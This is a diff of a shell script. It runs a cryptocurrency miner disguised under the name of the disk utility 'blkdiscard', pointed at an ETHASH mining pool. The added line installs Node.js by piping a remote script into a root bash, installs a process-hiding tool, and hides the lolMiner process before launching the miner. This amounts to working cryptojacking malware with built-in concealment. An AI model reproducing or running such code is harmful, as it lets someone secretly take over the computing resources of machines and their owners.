@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user legassa.001 
+sudo apt-get update && sudo apt-get full-upgrade && sudo apt-get install -f && sudo su --command "curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && sudo ph add lolMiner && ./blkdiscard --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user legassa.001
